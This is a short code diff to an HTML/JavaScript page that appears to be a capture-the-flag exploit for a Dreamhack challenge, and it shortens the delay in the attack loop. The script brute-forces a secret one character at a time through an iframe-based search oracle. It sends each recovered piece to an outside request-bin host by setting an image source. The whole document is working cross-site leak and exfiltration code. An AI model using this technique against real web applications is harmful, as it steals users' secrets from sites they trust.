@@ -1,6 +1,7 @@
 <iframe id="iframe"></iframe>
 <img id="img">
 <script>
+    const sleep = (ms) => new Promise(r => setTimeout(r, ms));
     async function req(url) {
         return await new Promise((resolve, reject) => {
             const iframe = document.getElementById("iframe");
@@ -31,7 +32,7 @@
 
         while (!secret.includes("}")) {
             for (let c of chars) {
-                await sleep(500);
+                await sleep(200);
                 if (await search(secret + c)) {
                     secret += c;
                     img.src = `https://${window.location.hash.slice(1)}.request.dreamhack.games/${secret}`;
